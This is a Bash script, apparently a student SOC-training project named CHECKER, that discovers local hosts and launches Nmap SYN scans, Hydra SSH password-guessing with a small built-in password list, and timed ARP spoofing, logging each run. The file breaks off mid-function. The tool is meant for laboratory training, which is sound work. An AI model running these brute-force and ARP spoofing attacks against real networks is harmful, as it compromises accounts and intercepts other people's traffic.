#!/usr/bin/env bash
# ================================================================================================
# Project: CHECKER - SOC Analyst
# Program Code: NX220
# Unit Code: TCB-2511
# Student: Javor Mirchev
# Student Code: s3
# Lecturer: Yuri Tsenkov
# Purpose: Provide a menu-driven Bash tool for controlled network security tests.
#          Discover IPv4 hosts, run Nmap scans, SSH dictionary tests and ARP
#          spoofing demonstrations, and record each session under /var/log/checker.
#          Support SOC training through repeatable tests and results that can be
#          compared with events recorded on the target systems.
# ================================================================================================

set -o pipefail
umask 077
export LC_ALL=C

# Check before parsing function bodies that use newer Bash syntax.
if (( BASH_VERSINFO[0] < 4 || (BASH_VERSINFO[0] == 4 && BASH_VERSINFO[1] < 2) )); then
    printf 'CHECKER requires Bash 4.2 or newer.\n' >&2
    exit 1
fi
CHECKER_VERSION="1.0.1"

# Defaults are optional: command-line arguments override them for this session.
NETWORK_OVERRIDE=""
NMAP_PORTS=""
DISCOVERY_TIMEOUT_SECONDS=60
NMAP_TIMEOUT_SECONDS=60
SSH_CHECK_TIMEOUT_SECONDS=12
HYDRA_TIMEOUT_SECONDS=300
HYDRA_WAIT_SECONDS=32
ARP_DURATION_SECONDS=30

# The assignment requires logs under /var/log.
LOG_DIR="/var/log/checker"
WORK_DIR=""
SUMMARY_LOG=""
SESSION_LOG=""
SESSION_ID="-"
SESSION_EXIT=0
RUN_ID=0
INTERFACE=""
NETWORK_CIDR=""
ATTACK_NAME=""
TARGET_IP=""
PEER_IP=""
TARGET_PORT="-"
OUTPUT_FILE="-"
RUN_ACTIVE=0
RUN_STARTED_AT=0
RUN_DURATION="-"
RUN_TIME_LIMIT="-"
SESSION_STARTED_AT=0
RUNS_TOTAL=0
RUNS_COMPLETED=0
RUNS_OTHER=0
RUNS_SKIPPED=0
ARP_STATE_FILE=""
# Only changed settings are saved here, before any write, for EXIT cleanup.
ARP_SETTING_KEYS=()
ARP_SETTING_VALUES=()

# These defaults live only in memory and are updated during the current session.
SSH_PORT=22
SSH_USERNAME=""
SSH_LIST_CHOICE=1
SSH_PASSWORD_FILE=""
PASSWORD_COUNT=0
# Optional examples; any readable password file can be chosen in the menu.
BUILTIN_PASSWORDS=("msfadmin" "admin" "password" "123456" "checker-demo")

# Colours are for the terminal UI only; log values remain plain text.
C_RESET="" C_BOLD="" C_RED="" C_GREEN="" C_YELLOW="" C_BLUE="" C_CYAN=""

setup_ui() {
    C_RESET="" C_BOLD="" C_RED="" C_GREEN="" C_YELLOW="" C_BLUE="" C_CYAN=""
    if [[ -t 1 && -t 2 && "${TERM:-dumb}" != dumb && ! -v NO_COLOR ]]; then
        C_RESET=$'\033[0m'
        C_BOLD=$'\033[1m'
        C_RED=$'\033[91m'
        C_GREEN=$'\033[92m'
        C_YELLOW=$'\033[93m'
        C_BLUE=$'\033[94m'
        C_CYAN=$'\033[96m'
    fi
}

info() { printf '%s[INFO]%s %s\n' "$C_BLUE" "$C_RESET" "$1"; }
pass() { printf '%s[PASS]%s %s\n' "$C_GREEN" "$C_RESET" "$1"; }
warn() { printf '%s[WARN]%s %s\n' "$C_YELLOW" "$C_RESET" "$1" >&2; }
fail() { printf '%s[FAIL]%s %s\n' "$C_RED" "$C_RESET" "$1" >&2; }

section() {
    printf '\n%s%s%s\n' "$C_BOLD$C_CYAN" "$1" "$C_RESET"
}

ui_row() {
    printf '  %-18s %s%s%s\n' "$1" "${3:-$C_CYAN}" "$2" "$C_RESET"
}

print_banner() {
    printf '\n%sCHECKER%s | SOC Analyst | NX220\n' "$C_BOLD$C_CYAN" "$C_RESET"
    printf 'Network discovery | Attack selection | Activity logs\n'
}

# INTERFACES and NETWORKS use matching indexes; LOCAL_IPS excludes our own addresses.
# Bash indexes start at zero, while the numbers shown in menus start at one.
INTERFACES=()
NETWORKS=()
LOCAL_IPS=()
TARGETS=()
ATTACK_NAMES=("TCP Port Scan" "SSH Dictionary Test" "ARP Spoofing Test")
ATTACK_DESCRIPTIONS=(
    "Scan selected TCP ports with Nmap SYN scanning."
    "Try a laboratory password list against one SSH account with Hydra."
    "Redirect one host's traffic for a second laboratory host using ARP spoofing."
)

die() {
    fail "$1"
    if [[ -n "$SESSION_LOG" ]]; then
        log_event "ERROR" 1 "$1" || fail "Cannot record the error in the logs."
    fi
    exit 1
}

read_input() {
    # Variable names are supplied only by this script, never by user input.
    # read writes into the caller's named variable; -r keeps backslashes literal.
    printf '%s[INPUT]%s %s' "$C_CYAN" "$C_RESET" "$1" >&2
    IFS= read -r "$2" || die "Input ended before the selection was complete."
}

cleanup() {
    local exit_code=$?
    # Finish restoration even if Ctrl+C is pressed again during cleanup.
    trap '' INT TERM HUP
    if (( RUN_ACTIVE )); then
        (( RUNS_OTHER += 1 ))
        RUN_ACTIVE=0
    fi
    restore_arp_settings || exit_code=1
    # WORK_DIR is always the private directory returned by mktemp.
    if [[ -n "$WORK_DIR" && "$WORK_DIR" == "$LOG_DIR"/.work.* ]]; then
        rm -rf -- "$WORK_DIR" || { fail "Cannot remove temporary files in $WORK_DIR."; exit_code=1; }
    fi
    if [[ -n "$SESSION_LOG" ]]; then
        log_event "SESSION_END" "$exit_code" \
            "executed=$RUNS_TOTAL completed=$RUNS_COMPLETED other=$RUNS_OTHER skipped=$RUNS_SKIPPED elapsed_s=$((SECONDS - SESSION_STARTED_AT))" \
            || { fail "Cannot record the final session result."; exit_code=1; }
    fi
    trap - EXIT
    exit "$exit_code"
}

log_event() {
    local line timestamp event_run="$RUN_ID"
    case "$1" in
        SESSION_START|SESSION_END|NETWORK_SELECTED)
            # Session/network events must not inherit the previous attack's fields.
            local ATTACK_NAME="" TARGET_IP="" PEER_IP="" TARGET_PORT="-"
            local OUTPUT_FILE="-" ARP_STATE_FILE="" RUN_DURATION="-" RUN_TIME_LIMIT="-"
            ;;
    esac
    [[ -n "$ATTACK_NAME" ]] || event_run=0
    timestamp=$(date -Is) || return 1
    # %q keeps error text and commands on one log line, even with tabs/newlines.
    printf -v line '%s\tattack="%s"\ttarget=%s\tpeer=%s\tinterface=%s\tport=%s\tstatus=%s\texit_code=%s\tduration_s=%s\tlimit_s=%s\toutput=%s\tarp_state=%s\tsession=%s\trun=%s\tnetwork=%s\tdetail=%q\n' \
        "$timestamp" "$ATTACK_NAME" "${TARGET_IP:--}" "${PEER_IP:--}" "${INTERFACE:--}" "$TARGET_PORT" \
        "$1" "$2" "$RUN_DURATION" "$RUN_TIME_LIMIT" "$OUTPUT_FILE" "${ARP_STATE_FILE:--}" \
        "$SESSION_ID" "$event_run" "${NETWORK_CIDR:--}" "${3:--}"
    # Preserve the session copy even if the shared history can no longer be written.
    [[ -z "$SESSION_LOG" ]] || printf '%s' "$line" >> "$SESSION_LOG" || return 1
    printf '%s' "$line" >> "$SUMMARY_LOG"
}

interrupt_run() {
    if (( RUN_ACTIVE )); then
        RUN_DURATION=$((SECONDS - RUN_STARTED_AT))
        log_event "INTERRUPTED" 130 || fail "Cannot write the interruption log."
        RUN_ACTIVE=0
        (( RUNS_OTHER += 1 ))
    fi
    printf '\n' >&2
    warn "Interrupted."
    exit 130
}

run_with_timeout() (
    local duration="$1" kill_after=5s
    shift
    # arpspoof needs time to send corrective ARP replies after TERM.
    [[ "$1" != arpspoof ]] || kill_after=15s
    # wait can handle Ctrl+C immediately. Forward it to timeout, which stops
    # the tool's process group and allows its cleanup before forced termination.
    trap '
        trap "" INT TERM HUP
        if [[ -n "$!" ]]; then
            kill -TERM "$!" 2>/dev/null
            wait "$!"
        fi
        exit 130
    ' INT TERM HUP
    timeout --kill-after="$kill_after" "$duration" "$@" &
    wait "$!"
)

check_requirements() {
    [[ "${OSTYPE:-}" == linux* ]] || die "Run this script on Linux (Kali is recommended)."
    (( EUID == 0 )) || die "Run this script with sudo."
    local tool package choice
    local -a missing=() packages=()
    section "[1/4] Dependency Check"
    for tool in ip nmap hydra arpspoof sysctl flock timeout tee awk sort shuf mktemp date mkdir chmod rm sha256sum; do
        if command -v "$tool" >/dev/null 2>&1; then
            ui_row "$tool" "READY" "$C_GREEN"
        else
            ui_row "$tool" "MISSING" "$C_YELLOW"
            missing+=("$tool")
            # Install the package that supplies each missing command.
            case "$tool" in
                ip) package="iproute2" ;;
                nmap|hydra) package="$tool" ;;
                arpspoof) package="dsniff" ;;
                sysctl) package="procps" ;;
                flock) package="util-linux" ;;
                awk) package="gawk" ;;
                *) package="coreutils" ;;
            esac
            [[ " ${packages[*]} " == *" $package "* ]] || packages+=("$package")
        fi
    done
    if (( ${#missing[@]} )); then
        warn "Missing required tools: ${missing[*]}"
        command -v apt-get >/dev/null 2>&1 || die "apt-get is unavailable. Install the missing tools manually."
        info "Packages needed: ${packages[*]}"
        read_input "Download and install the missing tools now? [y/N]: " choice
        case "$choice" in
            y|Y)
                info "Updating the package list..."
                apt-get update || die "The package list could not be updated."
                info "Downloading and installing: ${packages[*]}"
                apt-get install -y -- "${packages[@]}" || die "Package installation failed."
                info "Verifying the installed tools..."
                for tool in "${missing[@]}"; do
                    command -v "$tool" >/dev/null 2>&1 || die "$tool is still unavailable after installation."
                    ui_row "$tool" "READY" "$C_GREEN"
                done
                ;;
            n|N|"") die "Required tools are missing and installation was cancelled." ;;
            *) die "Invalid installation choice." ;;
        esac
    fi
    pass "Dependency check completed."
}

setup_logs() {
    [[ ! -L "$LOG_DIR" ]] || die "The log directory must not be a symbolic link."
    mkdir -p -- "$LOG_DIR" || die "Cannot create $LOG_DIR."
    chmod 700 -- "$LOG_DIR" || die "Cannot set log directory permissions."
    # Concurrent runs could restore each other's temporary ARP network settings.
    [[ ! -L "$LOG_DIR/session.lock" ]] || die "The session lock must not be a symbolic link."
    exec {SESSION_LOCK_FD}> "$LOG_DIR/session.lock" || die "Cannot open the session lock."
    flock -n "$SESSION_LOCK_FD" || die "Another CHECKER session is running. Close it first."
    SUMMARY_LOG="$LOG_DIR/checker.log"
    [[ ! -L "$SUMMARY_LOG" ]] || die "The summary log must not be a symbolic link."
    : >> "$SUMMARY_LOG" || die "Cannot write to $SUMMARY_LOG."
    chmod 600 -- "$SUMMARY_LOG" || die "Cannot set summary log permissions."
    WORK_DIR=$(mktemp -d "$LOG_DIR/.work.XXXXXX") || die "Cannot create temporary files."
    SESSION_LOG=$(mktemp "$LOG_DIR/session-$(date -u +%Y%m%dT%H%M%SZ).XXXXXX.log") || die "Cannot create a session log."
    SESSION_ID="${SESSION_LOG##*/}"
}

record_session_start() {
    local checksum options="(defaults)"
    checksum=$(sha256sum < "${BASH_SOURCE[0]}") || die "Cannot record the script checksum."
    (( $# == 0 )) || printf -v options '%q ' "$@"
    log_event "SESSION_START" 0 \
        "checker=$CHECKER_VERSION script_sha256=${checksum%% *} bash=$BASH_VERSION operator=${SUDO_USER:-${USER:-unknown}} options=$options" \
        || die "Cannot record the session configuration."
    info "Session: $SESSION_ID"
    info "Session log: $SESSION_LOG"
}

valid_ipv4() {
    # Check the address shape first, then ensure every octet is between 0 and 255.
    [[ "$1" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
    local octet
    local -a octets=()
    IFS='.' read -r -a octets <<< "$1"
    for octet in "${octets[@]}"; do
        # Reject ambiguous representations such as 010.001.001.001.
        [[ "$octet" == 0 || "$octet" != 0* ]] || return 1
        (( 10#$octet <= 255 )) || return 1
    done
    return 0
}

contains_ip() {
    local wanted="$1" candidate
    shift
    for candidate in "$@"; do
        [[ "$candidate" == "$wanted" ]] && return 0
    done
    return 1
}

valid_cidr() {
    [[ "$1" == */* ]] || return 1
    valid_ipv4 "${1%/*}" || return 1
    local prefix="${1##*/}"
    [[ "$prefix" =~ ^(0|[1-9][0-9]?)$ ]] && (( prefix <= 32 ))
}

valid_port_list() {
    # Accept numeric ports and ranges; never pass arbitrary Nmap options through.
    [[ "$1" =~ ^[0-9]+(-[0-9]+)?(,[0-9]+(-[0-9]+)?)*$ ]] || return 1
    local part first last
    local -a parts=()
    IFS=',' read -r -a parts <<< "$1"
    for part in "${parts[@]}"; do
        first="${part%%-*}"
        last="${part##*-}"
        [[ ${#first} -le 5 && ${#last} -le 5 ]] || return 1
        (( 10#$first >= 1 && 10#$first <= 10#$last && 10#$last <= 65535 )) || return 1
    done
}

parse_options() {
    local option value setting
    while (( $# )); do
        option="$1"
        case "$option" in
            --network|--ports|--discovery-timeout|--scan-timeout|--ssh-check-timeout|--hydra-timeout|--ssh-wait|--arp-duration) ;;
            *) die "Unknown option: $option. Use --help for instructions." ;;
        esac
        (( $# >= 2 )) && [[ -n "$2" ]] || die "Missing value for $option."
        value="$2"
        case "$option" in
            --network)
                valid_cidr "$value" || die "Use an IPv4/CIDR range with a prefix from 0 to 32."
                NETWORK_OVERRIDE="$value"
                ;;
            --ports)
                valid_port_list "$value" || die "Use TCP ports/ranges from 0 to 65535, for example 22,80,8000-8100."
                NMAP_PORTS="$value"
                ;;
            *)
                [[ "$value" =~ ^[1-9][0-9]*$ ]] || die "$option requires positive whole seconds."
                case "$option" in
                    --discovery-timeout) setting=DISCOVERY_TIMEOUT_SECONDS ;;
                    --scan-timeout) setting=NMAP_TIMEOUT_SECONDS ;;
                    --ssh-check-timeout) setting=SSH_CHECK_TIMEOUT_SECONDS ;;
                    --hydra-timeout) setting=HYDRA_TIMEOUT_SECONDS ;;
                    --ssh-wait) setting=HYDRA_WAIT_SECONDS ;;
                    --arp-duration) setting=ARP_DURATION_SECONDS ;;
                esac
                # setting is selected above, not supplied as executable user text.
                printf -v "$setting" '%s' "$value"
                ;;
        esac
        shift 2
    done
}

reset_run_context() {
    ATTACK_NAME=""
    TARGET_IP=""
    PEER_IP=""
    ARP_STATE_FILE=""
    TARGET_PORT="-"
    OUTPUT_FILE="-"
    RUN_DURATION="-"
    RUN_TIME_LIMIT="-"
}

choose_network() {
    local rows index interface family address choice
    reset_run_context
    # Rebuild these lists when the user refreshes after DHCP/interface changes.
    INTERFACES=()
    NETWORKS=()
    LOCAL_IPS=()
    rows=$(ip -o -4 addr show) || die "Cannot read local IPv4 interfaces."
    while read -r index interface family address _; do
        [[ "$family" == inet ]] || continue
        valid_ipv4 "${address%/*}" || continue
        LOCAL_IPS+=("${address%/*}")
        [[ "${interface%%@*}" != lo && "$address" != 127.* ]] || continue
        INTERFACES+=("${interface%%@*}")
        NETWORKS+=("$address")
    done <<< "$rows"
    (( ${#INTERFACES[@]} )) || die "No usable IPv4 interface was found."

    section "[2/4] Laboratory Network"
    info "Choose the connection used by your laboratory machines."
    for index in "${!INTERFACES[@]}"; do
        printf '  %s%d)%s %-12s %s\n' "$C_CYAN" "$((index + 1))" "$C_RESET" \
            "${INTERFACES[index]}" "${NETWORKS[index]}"
    done
    read_input "Network number: " choice
    [[ "$choice" =~ ^[1-9][0-9]{0,2}$ ]] || die "Invalid network selection."
    (( choice <= ${#INTERFACES[@]} )) || die "Invalid network selection."
    INTERFACE="${INTERFACES[choice - 1]}"
    NETWORK_CIDR="${NETWORK_OVERRIDE:-${NETWORKS[choice - 1]}}"
    pass "Laboratory interface selected."
    ui_row "Interface" "$INTERFACE"
    ui_row "Discovery range" "$NETWORK_CIDR"
    log_event "NETWORK_SELECTED" 0 || die "Cannot record the selected network."
}

discover_hosts() {
    local host discovery_file live_host_text
    local -a live_hosts=()
    TARGETS=()
    discovery_file=$(mktemp "$LOG_DIR/discovery.XXXXXX.log") || die "Cannot create a discovery log."
    section "[3/4] Host Discovery"
    info "Discovering active IPv4 hosts..."
    # Nmap accepts a local address/CIDR and expands it to the corresponding subnet.
    if ! run_with_timeout "${DISCOVERY_TIMEOUT_SECONDS}s" nmap -e "$INTERFACE" -sn -n \
        -oG "$discovery_file" "$NETWORK_CIDR" > "$WORK_DIR/discovery-console.log" 2>&1; then
        fail "Discovery failed or timed out. Tool output follows:"
        while IFS= read -r host; do printf '%s\n' "$host" >&2; done < "$WORK_DIR/discovery-console.log"
        die "Check the laboratory connection and subnet size."
    fi
    live_host_text=$(awk '/Status: Up/ {print $2}' "$discovery_file" | sort -Vu) || die "Cannot read discovery results."
    [[ -z "$live_host_text" ]] || mapfile -t live_hosts <<< "$live_host_text"
    section "Available IP Addresses"
    for host in "${live_hosts[@]}"; do
        valid_ipv4 "$host" || continue
        if contains_ip "$host" "${LOCAL_IPS[@]}"; then
            printf '  %s%s%s  [this Kali machine]\n' "$C_BLUE" "$host" "$C_RESET"
        else
            printf '  %s%s%s\n' "$C_GREEN" "$host" "$C_RESET"
            TARGETS+=("$host")
        fi
    done
    info "Discovery log: $discovery_file"
    if (( ${#TARGETS[@]} )); then
        pass "${#TARGETS[@]} target hosts are available."
    else
        warn "No remote hosts were detected. You can still enter a known target IPv4 address."
    fi
}

choose_attack() {
    local index choice
    ATTACK_DESCRIPTIONS[0]="Scan TCP ports ${NMAP_PORTS:-from the 100 most common ports} with Nmap SYN scanning."
    ATTACK_DESCRIPTIONS[2]="Redirect one host's traffic for a second laboratory host using ARP spoofing for ${ARP_DURATION_SECONDS}s."
    section "[4/4] Attack Selection"
    for index in "${!ATTACK_NAMES[@]}"; do
        printf '  %s%d)%s %s%s%s\n     %s\n' "$C_CYAN" "$((index + 1))" "$C_RESET" \
            "$C_BOLD" "${ATTACK_NAMES[index]}" "$C_RESET" "${ATTACK_DESCRIPTIONS[index]}"
    done
    printf '  %sR)%s Choose an attack at random\n' "$C_YELLOW" "$C_RESET"
    read_input "Attack number or R: " choice
    case "$choice" in
        1|2|3) ATTACK_INDEX=$((choice - 1)) ;;
        r|R) ATTACK_INDEX=$(shuf -i 0-2 -n 1) || die "Random attack selection failed." ;;
        *) die "Invalid attack selection." ;;
    esac
    ATTACK_NAME="${ATTACK_NAMES[ATTACK_INDEX]}"
    info "Selected: $ATTACK_NAME"
    printf '%s\n' "${ATTACK_DESCRIPTIONS[ATTACK_INDEX]}"
    log_event "ATTACK_CHOSEN" "-" || die "Cannot record the chosen attack."
}

choose_host() {
    # The destination variable is an internal name, like TARGET_IP or PEER_IP.
    local destination="$1" title="$2" choice index selected
    shift 2
    local -a hosts=("$@")
    section "$title"
    for index in "${!hosts[@]}"; do
        printf '  %s%d)%s %s\n' "$C_CYAN" "$((index + 1))" "$C_RESET" "${hosts[index]}"
    done
    (( ${#hosts[@]} == 0 )) || printf '  %sR)%s Choose a detected host at random\n' "$C_YELLOW" "$C_RESET"
    read_input "Host number, IPv4 address or R: " choice
    case "$choice" in
        r|R)
            (( ${#hosts[@]} )) || die "No detected hosts are available for random selection."
            selected=$(printf '%s\n' "${hosts[@]}" | shuf -n 1) || die "Random host selection failed."
            ;;
        *)
            if [[ "$choice" =~ ^[1-9][0-9]{0,5}$ ]]; then
                (( choice <= ${#hosts[@]} )) || die "Invalid host number."
                selected="${hosts[choice - 1]}"
            else
                valid_ipv4 "$choice" || die "Invalid target selection or IPv4 address."
                selected="$choice"
            fi
            ;;
    esac
    if [[ "$selected" == 127.* ]] || ! (( ${selected%%.*} > 0 && ${selected%%.*} < 224 )); then
        die "Choose a remote unicast IPv4 address."
    fi
    contains_ip "$selected" "${LOCAL_IPS[@]}" && die "The local machine cannot be selected as a target."
    [[ "$destination" != PEER_IP || "$selected" != "$TARGET_IP" ]] || die "The ARP target and peer must be different."
    contains_ip "$selected" "${hosts[@]}" || info "Manual address: $selected (not confirmed by discovery)."
    printf -v "$destination" '%s' "$selected"
}

choose_target() {
    choose_host TARGET_IP "Target Selection" "${TARGETS[@]}"
    info "Target: $TARGET_IP"
    # The complete selection can now be logged with its actual target address.
    log_event "SELECTED" "-" || die "Cannot record the selected attack and target."
}

choose_port() {
    local choice
    read_input "$1 port [Enter for $2]: " choice
    choice="${choice:-$2}"
    [[ "$choice" =~ ^[0-9]{1,5}$ ]] || die "Invalid port number."
    (( 10#$choice >= 1 && 10#$choice <= 65535 )) || die "Port must be between 1 and 65535."
    # 10# makes the input decimal even when it contains leading zeroes.
    TARGET_PORT=$((10#$choice))
}

check_target_route() {
    local route
    local -a query=(-4 route get "$TARGET_IP" ipproto tcp)
    [[ ! "$TARGET_PORT" =~ ^[0-9]+$ ]] || query+=(dport "$TARGET_PORT")
    # Hydra uses the kernel route; it has no equivalent of Nmap's -e interface flag.
    # Check before the port probe and again after the user's SSH setup questions.
    if route=$(ip "${query[@]}" 2>&1) && \
            [[ "$route" == "$TARGET_IP "* && " $route " == *" dev $INTERFACE "* ]]; then
        log_event "ROUTE_OK" 0 "$route" || die "Cannot record the target route."
        return 0
    fi
    (( RUNS_SKIPPED += 1 ))
    log_event "SKIPPED_ROUTE" 2 "$route" || die "Cannot record the route check."
    warn "No usable route to $TARGET_IP through $INTERFACE was confirmed; the test was skipped."
    info "Use r to choose the correct network connection and refresh the host list."
    return 1
}

run_tool() {
    local status tool_exit status_color command_text
    local -a pipeline_codes=()
    if [[ "$1" != arpspoof ]]; then
        check_target_route || return 2
    fi
    RUN_TIME_LIMIT="$NMAP_TIMEOUT_SECONDS"
    [[ "$1" != hydra ]] || RUN_TIME_LIMIT="$HYDRA_TIMEOUT_SECONDS"
    [[ "$1" != arpspoof ]] || RUN_TIME_LIMIT="$ARP_DURATION_SECONDS"
    OUTPUT_FILE=$(mktemp "$LOG_DIR/run-${TARGET_IP}.XXXXXX.log") || die "Cannot create an output log."
    RUN_STARTED_AT=$SECONDS
    # Arguments are quoted separately so names containing spaces remain unambiguous.
    printf -v command_text '%q ' "$@"
    log_event "STARTED" "-" "$command_text" || die "Cannot log the attack start."
    RUN_ACTIVE=1
    (( RUNS_TOTAL += 1 ))
    section "Execution #$RUN_ID"
    ui_row "Attack" "$ATTACK_NAME"
    ui_row "Target" "$TARGET_IP"
    [[ -z "$PEER_IP" ]] || ui_row "Peer host" "$PEER_IP"
    [[ "$TARGET_PORT" == "-" ]] || ui_row "Port" "$TARGET_PORT"
    ui_row "Time limit" "${RUN_TIME_LIMIT}s"
    ui_row "Output log" "$OUTPUT_FILE"
    info "Running the selected tool..."
    # A private working directory also contains Hydra's temporary restore file.
    # Keep the log reader alive while a Ctrl+C-triggered tool cleanup finishes.
    (
        cd "$WORK_DIR" || exit 1
        run_with_timeout "${RUN_TIME_LIMIT}s" "$@"
    ) 2>&1 | (trap '' INT TERM HUP; exec tee "$OUTPUT_FILE")
    # Save both exit codes immediately: the tool/timeout first, the log writer second.
    pipeline_codes=("${PIPESTATUS[@]}")
    RUN_DURATION=$((SECONDS - RUN_STARTED_AT))
    tool_exit="${pipeline_codes[0]}"
    case "$tool_exit" in
        0) status="COMPLETED" ;;
        124)
            status="TIMED_OUT"
            # A bounded ARP demonstration is meant to end at its time limit.
            [[ "$1" != arpspoof ]] || status="DURATION_REACHED"
            ;;
        # SIGKILL may come from the timeout grace period or an external cause.
        137) status="FORCED_STOP" ;;
        130|143) status="INTERRUPTED" ;;
        *) status="TOOL_ERROR" ;;
    esac
    if (( pipeline_codes[1] != 0 )); then
        status="LOG_ERROR"
        tool_exit=1
    fi
    log_event "$status" "$tool_exit" || die "Cannot log the attack result."
    RUN_ACTIVE=0
    if [[ "$status" == COMPLETED || "$status" == DURATION_REACHED ]]; then
        (( RUNS_COMPLETED += 1 ))
        status_color="$C_GREEN"
    else
        (( RUNS_OTHER += 1 ))
        status_color="$C_RED"
        [[ "$status" == TIMED_OUT || "$status" == FORCED_STOP || "$status" == INTERRUPTED ]] && status_color="$C_YELLOW"
    fi
    section "Execution Result"
    ui_row "Status" "$status" "$status_color"
    ui_row "Exit code" "$tool_exit" "$status_color"
    ui_row "Elapsed time" "${RUN_DURATION}s"
    if [[ "$status" == TIMED_OUT ]]; then
        warn "The execution time limit was reached. The results may be incomplete."
    elif [[ "$status" == DURATION_REACHED ]]; then
        info "The planned ARP test duration ended. Verify the target's ARP table."
    elif [[ "$status" == FORCED_STOP ]]; then
        warn "The tool was forcibly stopped (SIGKILL). The results may be incomplete."
    elif [[ "$status" == COMPLETED ]]; then
        info "The tool finished; check its output for findings."
    fi
    info "Summary log: $SUMMARY_LOG"
    # COMPLETED describes the tool execution, not a successful compromise.
    [[ "$status" != DURATION_REACHED ]] || return 0
    return "$tool_exit"
}

attack_nmap() {
    local -a ports=(--top-ports 100)
    [[ -z "$NMAP_PORTS" ]] || ports=(-p "$NMAP_PORTS")
    TARGET_PORT="${NMAP_PORTS:-top-100}"
    run_tool nmap -e "$INTERFACE" -sS -n -Pn "${ports[@]}" "$TARGET_IP"
}

check_ssh_port() {
    local check_exit status="SSH_PORT_OPEN" line started_at=$SECONDS
    check_target_route || return 1
    RUN_TIME_LIMIT="$SSH_CHECK_TIMEOUT_SECONDS"
    OUTPUT_FILE=$(mktemp "$LOG_DIR/ssh-check-${TARGET_IP}.XXXXXX.log") || die "Cannot create an SSH check log."
    info "Checking TCP port $TARGET_PORT on $TARGET_IP before Hydra..."
    run_with_timeout "${SSH_CHECK_TIMEOUT_SECONDS}s" nmap -e "$INTERFACE" -sT -Pn -n -p "$TARGET_PORT" \
        -oG "$OUTPUT_FILE" "$TARGET_IP" \
        > "$WORK_DIR/ssh-check-console.log" 2>&1
    check_exit=$?
    RUN_DURATION=$((SECONDS - started_at))
    # Keep the human-readable output as comments alongside Nmap's port record.
    while IFS= read -r line; do
        printf '# %s\n' "$line" >> "$OUTPUT_FILE" || die "Cannot save the SSH check output."
    done < "$WORK_DIR/ssh-check-console.log"
    if (( check_exit != 0 )); then
        status="SSH_CHECK_ERROR"
    elif ! awk -v ip="$TARGET_IP" -v port="$TARGET_PORT" \
        '$1 == "Host:" && $2 == ip && index($0, "Ports: " port "/open/tcp/") {found=1} END {exit !found}' "$OUTPUT_FILE"; then
        status="SKIPPED_PORT_UNAVAILABLE"
    fi
    log_event "$status" "$check_exit" || die "Cannot record the SSH port check."
    if [[ "$status" == SSH_PORT_OPEN ]]; then
        pass "TCP port $TARGET_PORT is open; continuing with the SSH test."
        RUN_DURATION="-"
        RUN_TIME_LIMIT="-"
        return 0
    fi
    (( RUNS_SKIPPED += 1 ))
    if [[ "$status" == SSH_CHECK_ERROR ]]; then
        warn "The SSH port check failed (exit code $check_exit). The SSH test was skipped."
    else
        warn "TCP port $TARGET_PORT was not confirmed open. The SSH test was skipped."
    fi
    info "SSH check log: $OUTPUT_FILE"
    return 1
}

prepare_password_list() {
    local choice password_file count=0
    printf '  1) Built-in laboratory list (%d candidates)\n  2) Your own file (no password-count limit)\n' "${#BUILTIN_PASSWORDS[@]}"
    read_input "Password list [Enter for $SSH_LIST_CHOICE]: " choice
    choice="${choice:-$SSH_LIST_CHOICE}"
    case "$choice" in
        1)
            count=${#BUILTIN_PASSWORDS[@]}
            (( count > 0 )) || die "The built-in list is empty."
            printf '%s\n' "${BUILTIN_PASSWORDS[@]}" > "$WORK_DIR/passwords.txt" || die "Cannot prepare the built-in list."
            SSH_LIST_CHOICE=1
            PASSWORD_COUNT=$count
            return 0
            ;;
        2) ;;
        *) die "Invalid password list selection." ;;
    esac
    if [[ -n "$SSH_PASSWORD_FILE" ]]; then
        read_input "Password file [Enter for $SSH_PASSWORD_FILE]: " password_file
        password_file="${password_file:-$SSH_PASSWORD_FILE}"
    else
        read_input "Path to a laboratory password list: " password_file
    fi
    [[ -f "$password_file" && -r "$password_file" ]] || die "The password list is not a readable regular file."
    info "Preparing and validating the password list..."
    # Stream large files with awk, normalize CRLF, and reject empty or binary entries.
    # LC_ALL=C counts bytes; 255-byte entries fit Hydra's credential buffers.
    awk '
        {
            sub(/\r$/, "")
            if (length($0) < 1 || length($0) > 255 || index($0, sprintf("%c", 0))) exit 1
            print
        }
    ' < "$password_file" > "$WORK_DIR/passwords.txt" \
        || die "Cannot prepare the list. Use one non-empty password of 1-255 bytes per line, without NUL bytes."
    count=$(awk 'END {print NR}' "$WORK_DIR/passwords.txt") || die "Cannot count the password list."
    (( count > 0 )) || die "The password list is empty."
    SSH_LIST_CHOICE=2
    SSH_PASSWORD_FILE="$password_file"
    PASSWORD_COUNT=$count
}

attack_hydra() {
    local username
    [[ "$HYDRA_TIMEOUT_SECONDS" =~ ^[1-9][0-9]*$ ]] || die "HYDRA_TIMEOUT_SECONDS must be a positive whole number."
    choose_port "SSH" "$SSH_PORT"
    SSH_PORT="$TARGET_PORT"
    # An open TCP port allows a test to proceed; it does not prove a valid login.
    check_ssh_port || return 2
    if [[ -n "$SSH_USERNAME" ]]; then
        read_input "Laboratory SSH username [Enter for $SSH_USERNAME]: " username
        username="${username:-$SSH_USERNAME}"
    else
        read_input "Laboratory SSH username: " username
    fi
    # Quoting preserves domain names, spaces and UTF-8; no input is evaluated as code.
    [[ -n "$username" && ${#username} -le 255 && "$username" != *[[:cntrl:]]* ]] \
        || die "Use an SSH username of 1-255 bytes, without control characters."
    SSH_USERNAME="$username"
    prepare_password_list
    info "Testing $PASSWORD_COUNT passwords against SSH port $TARGET_PORT."
    run_tool hydra -l "$SSH_USERNAME" -P "$WORK_DIR/passwords.txt" -s "$TARGET_PORT" \
        -t 1 -W 1 -w "$HYDRA_WAIT_SECONDS" -f -v -I "$TARGET_IP" ssh
}

restore_arp_settings() {
    local index key value current failed=0 log_failed=0
    (( ${#ARP_SETTING_KEYS[@]} )) || return 0
    for ((index=${#ARP_SETTING_KEYS[@]}-1; index>=0; index--)); do
        key="${ARP_SETTING_KEYS[index]}"
        value="${ARP_SETTING_VALUES[index]}"
        # Restoration must still run if writing the state log is no longer possible.
        if sysctl -q -w "$key=$value"; then
            current=$(sysctl -n "$key") || current=""
            if [[ "$current" == "$value" ]]; then
                printf 'restored %s=%s\n' "$key" "$value" >> "$ARP_STATE_FILE" || log_failed=1
                continue
            fi
        fi
        fail "Could not restore $key=$value. See $ARP_STATE_FILE."
        failed=1
    done
    if (( failed )); then
        log_event "LOCAL_SETTINGS_RESTORE_ERROR" 1 || fail "Cannot log the restoration error."
        return 1
    fi
    ARP_SETTING_KEYS=()
    ARP_SETTING_VALUES=()
